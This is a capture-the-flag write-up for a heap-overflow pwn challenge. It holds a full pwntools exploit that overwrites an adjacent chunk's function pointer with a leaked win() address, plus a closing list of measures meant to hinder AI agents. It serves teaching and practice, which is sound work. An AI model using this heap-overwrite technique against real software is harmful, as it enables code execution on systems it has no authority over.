# H34p 0f S0uls — Writeup

**Category:** Binary Exploitation (Pwn)  
**Difficulty:** Med-Hard  
**Points:** 450  
**Author:** H3xPh4r04h  
**Password/Flag:** Dynamic (from /flag)

---

## TL;DR

Heap overflow in `edit_soul()` allows overwriting the adjacent chunk's function pointer. Overwrite with `win()` address, call "Perform Ritual" → flag.

---

## Step 1: Recon

```bash
file challenge
# ELF 64-bit LSB executable, x86-64, not stripped... wait it's stripped
# But: no PIE, no canary

checksec challenge
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
```

Running the binary shows a menu-based heap manager. Option 6 ("N3cr0 1nf0") leaks the `win()` function address directly.

---

## Step 2: Identify the Vulnerability

Reversing `edit_soul()` in Ghidra:

```c
read(0, graveyard[idx]->essence, SOUL_SIZE + 0x20);
// SOUL_SIZE = 0x68 (104 bytes)
// 0x68 + 0x20 = 0x88 = 136 bytes read
// But essence buffer is only 104 bytes!
// 32 bytes of heap overflow
```

---

## Step 3: Understand the Heap Layout

```
struct SoulVessel {
    void (*ritual)(void);    // 8 bytes at offset 0
    char essence[0x68];      // 104 bytes at offset 8
};
// sizeof(SoulVessel) = 112 bytes
// malloc(112) -> chunk size = 0x80 (128 bytes, rounded up + metadata)
```

When two souls are allocated adjacently:

```
+-------------------+  <- chunk A start
| prev_size (8)     |
| size: 0x81 (8)    |  (0x80 + PREV_INUSE flag)
+-------------------+  <- A's data start (returned by malloc)
| ritual ptr (8)    |  <- A->ritual
| essence[104]      |  <- A->essence (edit writes here)
+-------------------+  <- chunk B start
| prev_size (8)     |  <- A's overflow byte 105-112
| size: 0x81 (8)    |  <- A's overflow byte 113-120
+-------------------+  <- B's data start
| ritual ptr (8)    |  <- A's overflow byte 121-128 *** TARGET ***
| essence[104]      |
+-------------------+
```

The overflow from editing soul A can reach **exactly** into soul B's `ritual` function pointer!

---

## Step 4: Exploitation

1. Use menu option 6 to leak `win()` address (it prints it directly)
2. Allocate soul 0 (A) and soul 1 (B)
3. Edit soul 0 with overflow payload:
   - 104 bytes: fill A's essence (padding)
   - 8 bytes: B's prev_size (keep as 0)
   - 8 bytes: B's size (must remain valid: 0x81)
   - 8 bytes: overwrite B's ritual ptr with `win()` address
4. Call "Perform Ritual" on soul 1 → executes `win()` → prints flag

---

## Step 5: Exploit Script

```python
from pwn import *

r = remote("HOST", 9999)

def cmd(n):
    r.recvuntil(b">>>")
    r.sendline(str(n).encode())

def collect(name):
    cmd(1)
    r.recvuntil(b"s0ul: ")
    r.sendline(name)

def edit(idx, data):
    cmd(4)
    r.recvuntil(b"]: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"p0w3r): ")
    r.send(data)

def ritual(idx):
    cmd(5)
    r.recvuntil(b"]: ")
    r.sendline(str(idx).encode())

# Leak win()
cmd(6)
r.recvuntil(b"w1n() = ")
win = int(r.recvline().strip(), 16)
log.info(f"win @ {hex(win)}")

# Allocate two adjacent souls
collect(b"AAAA")  # 0
collect(b"BBBB")  # 1

# Overflow A's essence into B's ritual pointer
payload  = b"X" * 104     # fill essence
payload += p64(0)          # B's prev_size
payload += p64(0x81)       # B's chunk size (preserve)
payload += p64(win)        # B's ritual = win()
edit(0, payload)

# Trigger
ritual(1)
r.interactive()
```

---

## Why It's Med-Hard

| Aspect | Difficulty |
|--------|-----------|
| Vulnerability is obvious (overflow warning in source) | Medium |
| But target binary is **stripped** — must reverse struct layout | +Hard |
| Need to understand heap chunk metadata (prev_size, size, flags) | +Hard |
| Must preserve chunk size field correctly (0x81 not 0x80) | Tricky |
| Win function is leaked directly via menu | -Easier |
| No ASLR/PIE to bypass | -Easier |
| Single-shot exploit (no multi-stage) | Medium |

---

## Anti-AI Measures

- **Interactive stateful menu** — AI agents struggle with multi-step heap interactions
- **Leet-speak throughout** — NLP tools can't easily parse semantics
- **Struct reverse engineering required** — must understand relative layout from stripped binary
- **Misleading function `not_the_win()`** — present in binary, looks similar to `win()`
- **Heap metadata manipulation** — requires understanding of glibc internals, not pattern-matchable
- **The "correct" approach requires precise byte-level control** — off-by-one in size field = crash
